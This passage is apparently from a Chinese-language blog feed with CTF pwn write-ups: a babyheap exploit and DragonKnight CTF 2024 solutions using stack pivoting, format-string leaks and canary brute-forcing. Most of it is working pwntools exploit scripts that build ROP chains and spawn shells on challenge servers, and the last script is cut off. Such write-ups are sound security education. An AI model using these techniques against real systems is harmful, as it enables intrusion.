title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>name = <span class="hljs-string">&quot;ACTF_2019_babyheap&quot;</span><br>p = process(name)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,26688)</span><br>elf = ELF(name)<br><br>binsh=<span class="hljs-number">0x602010</span><br>system_plt = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input size:&quot;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;Please input content:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input list index:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;Your choice:&quot;</span>,<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Please input list index:&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br>gdb.attach(p)<br><br>create(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">10</span>)<br>create(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">10</span>)<br><span class="hljs-comment">#create(0x100,b&#x27;C&#x27;*10)</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x10</span>,p64(binsh)+p64(system_plt))<br>show(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DragonKnightCTF wp</title>
      <link href="/2024/05/27/DragonKnightCTF-wp/"/>
      <url>/2024/05/27/DragonKnightCTF-wp/</url>
      
        <content type="html"><![CDATA[<p>DragonKnight CTF 2024 全部4道Pwn的WP</p><span id="more"></span><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>有栈溢出点，但只有8个字节，只能刚好覆盖到ret地址，所以要进行栈迁移<br>先用vmmap看一下能够写的位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>             Start                End Perm     Size Offset File<br>          0x400000           0x401000 r--p     1000      0 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x401000           0x402000 r-xp     1000   1000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x402000           0x403000 r--p     1000   2000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x403000           0x404000 r--p     1000   2000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x404000           0x405000 rw-p     1000   3000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e15000     0x7ffff7e16000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]<br>    0x7ffff7fa2000     0x7ffff7fa5000 rw-p     3000      0 [anon_7ffff7fa2]<br>    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]<br>    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]<br>    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]<br>    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]<br>0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]<br><span class="hljs-meta prompt_">pwndbg&gt;</span><br></code></pre></td></tr></table></figure><p>先以0x404500为迁移地址(记为addr)，不行再换</p><p>再看看ida</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> <span class="hljs-comment">; int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span>                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+21↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> buf             = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">100h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span>                 endbr64<br><span class="hljs-symbol">.text:</span>000000000040117A                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040117B                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span>000000000040117E                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">100h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401185</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040118A                 <span class="hljs-keyword">call</span>    inits<br><span class="hljs-symbol">.text:</span>000000000040118F                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, s          <span class="hljs-comment">; &quot;Hello, CTFer, do you know how to stack &quot;...</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401196</span>                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>000000000040119B                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+buf]  <span class="hljs-comment">; ret时填的位置</span><br><span class="hljs-symbol">.text:</span>00000000004011A2                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">110h</span>       <span class="hljs-comment">; nbytes</span><br><span class="hljs-symbol">.text:</span>00000000004011A7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; buf</span><br><span class="hljs-symbol">.text:</span>00000000004011AA                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; fd</span><br><span class="hljs-symbol">.text:</span>00000000004011AF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000004011B4                 <span class="hljs-keyword">call</span>    _read<br><span class="hljs-symbol">.text:</span>00000000004011B9                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000004011BE                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span>00000000004011BF                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>00000000004011BF <span class="hljs-comment">; &#125; // starts at 401176</span><br><span class="hljs-symbol">.text:</span>00000000004011BF main            endp<br></code></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>利用第一次溢出将rbp转到addr的位置，并再次调用read函数</li><li>利用第二次溢出将rsp转到addr+0x10的位置，将rbp转到addr+0x100的位置</li><li>此时调用read函数，写的位置就是addr的位置，之后执行call函数时会将read地址压入addr+0x8，rbp压入addr，但此时是在addr处写值，这样便有足够长的空间来构造rop链，利用此次rop链泄露puts函数地址，计算libc基址</li><li>在利用main函数构造栈帧，修改rbp，调用read函数</li><li>计算好偏移，利用read函数的ret来构造rop链，可以直接用one_gadget,或者system函数</li></ol><h4 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h4><p>buf数组的长度为0x100(256)，后边就是rbp和ret地址<br>先在rbp处填上addr，ret处填上read函数的位置(包括给read函数传参的指令，即0x40119B)<br>之后程序执行leave(相当于 mov rsp,rbp ; pop rbp)时，会将rbp的值填为addr</p><p><img src="/img/post/DragonKnightCTF-wp/stack_payload1_0.png"><br><img src="/img/post/DragonKnightCTF-wp/stack_payload1_1.png"></p><h4 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h4><p>继续调用read函数时，会从rbp+buf(即addr-0x100)处开始写值<br>执行call函数时，除了call函数中的leave ; ret<br>函数执行结束后仍有一组 leave ; ret,利用这个leave ; ret ,可以将rsp放到addr+8处，rbp放到rbp指向的位置处<br>这样就将栈迁移到了一个新的地方，并且我们知道此时栈上的一个地址addr</p><p><img src="/img/post/DragonKnightCTF-wp/stack_payload2_0.png"><br><img src="/img/post/DragonKnightCTF-wp/stack_payload2_1.png"></p><h4 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h4><p>迁移完之后，也有了伪造的栈上的地址，只要计算好偏移，使得 <code>rbp-rsp &lt;= (0x100-0x10) </code>,便可使执行read函数时能够在压入的rbp和返回地址上写值，同时要注意不能时rbp-rsp过小，从而放不下rop链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">30347</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>main = <span class="hljs-number">0x40117A</span><br>addr = <span class="hljs-number">0x404500</span><br>read = <span class="hljs-number">0x40119B</span><br>ret = <span class="hljs-number">0x4011BF</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x401210</span> <span class="hljs-comment">#0x0000000000401210 : pop rdi ; ret</span><br>leave_ret = <span class="hljs-number">0x4011BE</span><br><br><span class="hljs-comment"># 修改rbp(为了下一次溢出将rsp修改到这里)</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(addr) + p64(read)<br>p.sendafter(<span class="hljs-string">b&quot;pivoting?&quot;</span>,payload1)<br><br><span class="hljs-comment"># 修改rbp和rsp(这个rsp和第一次溢出时的rbp相等，但是执行了pop和ret操作，所以会增加0x10)</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(addr+<span class="hljs-number">0x100</span>) + p64(read)<br>p.send(payload2)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment"># 此时rbp位于addr+0x100，所以调用read函数时会在addr处开始写值</span><br><span class="hljs-comment"># 同时rsp位于addr+0x10处，然后执行了call read操作，使得addr+0x8处为read函数返回地址，addr处为rbp的值</span><br><span class="hljs-comment"># 所以第一个8字节为需要rbp填上的值，后面为ret到的地方</span><br><span class="hljs-comment"># 最后用main函数而不是read函数是因为我直接用read函数会报错，目前不知道原因</span><br>payload3 = p64(addr+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x10</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload3)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;Hello&#x27;</span>)[-<span class="hljs-number">12</span>:-<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br>puts_offset = <span class="hljs-number">0x084420</span><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base +<span class="hljs-number">0x052290</span><br>binsh = libc_base + <span class="hljs-number">0x1b45bd</span><br>one_gadget = libc_base + <span class="hljs-number">0xe3afe</span><br><br><span class="hljs-comment"># 修改rbp为addr+0x120，此时rsp为addr+0x30，刚好相差0xf0</span><br>payload4 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(addr+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x20</span>)+p64(read)<br>p.send(payload4)<br><br>sleep(<span class="hljs-number">0.1</span>)<br><br>pop_r12 = libc_base + <span class="hljs-number">0x2f709</span><br><br><span class="hljs-comment"># 第一个8字节为rbp，此时rbp为什么值都无所谓了，反正要拿到shell了</span><br>payload5 = p64(<span class="hljs-number">0</span>) + p64(pop_r12) + p64(<span class="hljs-number">0</span>) + p64(one_gadget)   <span class="hljs-comment"># p64(0) + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_addr)</span><br>p.send(payload5)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>漏洞点在gift函数中，有一个格式化字符串漏洞和栈溢出漏洞<br>想要程序运行到gift函数中需要小小逆向一下，逆向不难，token是按位取反后base32加密与encode_token对比<br>后边有个算术题，要注意一下用eval时c和python关于%运算符的处理稍有不同，可以特殊处理使得python的运算结果和c相同，但没必要，多运行几次就行了<br>之后利用格式化字符串漏洞泄露canary、main的rbp(用于计算bihsh的偏移)、以及ret地址(用于计算pie)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>encode_token = <span class="hljs-string">&quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&quot;</span><br>token = base64.b32decode(encode_token.encode())<br><br>token = <span class="hljs-built_in">list</span>(token)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(token)):<br>    token[i] = ~token[i]<br>    token[i] = <span class="hljs-built_in">chr</span>(token[i]&amp;<span class="hljs-number">0xFF</span>)<br><br>token = <span class="hljs-string">&quot;&quot;</span>.join(token).encode()<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./attachment&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">30087</span>)<br>elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Please give me your token: &#x27;</span>)<br>p.sendline(token)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Right!\n&#x27;</span>)<br>math = p.recvline()<br>math = math.decode()[:-<span class="hljs-number">3</span>]<br>math_res = <span class="hljs-built_in">eval</span>(math)<br>p.sendline(<span class="hljs-built_in">str</span>(math_res).encode())<br>p.recvline(<span class="hljs-string">b&#x27;gift:\n&#x27;</span>)<br><br>payload1 = <span class="hljs-string">b&#x27;%11$p&#x27;</span>+ <span class="hljs-string">b&#x27;%12$p&#x27;</span>+<span class="hljs-string">b&#x27;%13$p&#x27;</span> + <span class="hljs-string">b&#x27;x&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>p.sendline(payload1)<br>data = p.recv()<br><span class="hljs-built_in">print</span>(data)<br>data = data.split(<span class="hljs-string">b&#x27;x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;0x&#x27;</span>+data[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>main_rbp = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;0x&#x27;</span>+data[<span class="hljs-number">2</span>][:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>main_2042_addr  =<span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;0x&#x27;</span>+data[<span class="hljs-number">3</span>],<span class="hljs-number">16</span>)<br>rsp_addr = main_rbp - <span class="hljs-number">0x1e0</span> <br>binsh = rsp_addr + <span class="hljs-number">0x10</span><br>pie = main_2042_addr - <span class="hljs-number">0x2042</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br>log.success(<span class="hljs-string">&quot;binsh: &quot;</span>+<span class="hljs-built_in">hex</span>(binsh))<br>log.success(<span class="hljs-string">&quot;pie: &quot;</span>+<span class="hljs-built_in">hex</span>(pie))<br><br>gift_addr = pie + <span class="hljs-number">0x149A</span><br>pop_rdi = pie+<span class="hljs-number">0x2072</span> <span class="hljs-comment"># 0x0000000000002072 : pop rdi ; ret</span><br>system_plt = pie + <span class="hljs-number">0x11C0</span><br>ret = pie + <span class="hljs-number">0x101a</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+ <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> + p64(canary) + p64(main_rbp) + p64(pop_rdi) + p64(binsh) +  p64(ret) + p64(system_plt)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>直接one by one爆破canary，爆破完canary之后就和正常的栈溢出题目没什么不同了,想怎么做怎么做<br>由于这题是静态链接的题，没有libc，所以用read函数写一个’&#x2F;bin&#x2F;sh\x00’，之后用系统调用获取shell</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn_patched&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">31345</span>)<br>elf=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################  explode canary  ####################</span><br><span class="hljs-comment">#######################################################</span><br>p.recvuntil(<span class="hljs-string">b&#x27;please input:\n&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>i = <span class="hljs-number">0</span><br>k = <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span>(k&lt;=<span class="hljs-number">8</span>):<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span>(i&lt;=<span class="hljs-number">255</span>):<br>        canary_send = canary + i.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + canary_send<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[Running] explode the &quot;</span> + <span class="hljs-built_in">str</span>(k) + <span class="hljs-string">&quot;th bytes of canary ,now try &quot;</span> + <span class="hljs-built_in">hex</span>(i) + <span class="hljs-string">&quot;, canary: &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(canary_send)<br>        p.send(payload)<br>        res = p.recvline()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;res: &#x27;</span> + res)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">b&#x27;input&#x27;</span> <span class="hljs-keyword">in</span> res):<br>            canary = canary_send<br>            k+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            p.recvline()<br>            i+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">256</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[Error] Exploit failed, retry&quot;</span>)<br>                i = <span class="hljs-number">0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;[Success] canary: &quot;</span>,end=<span 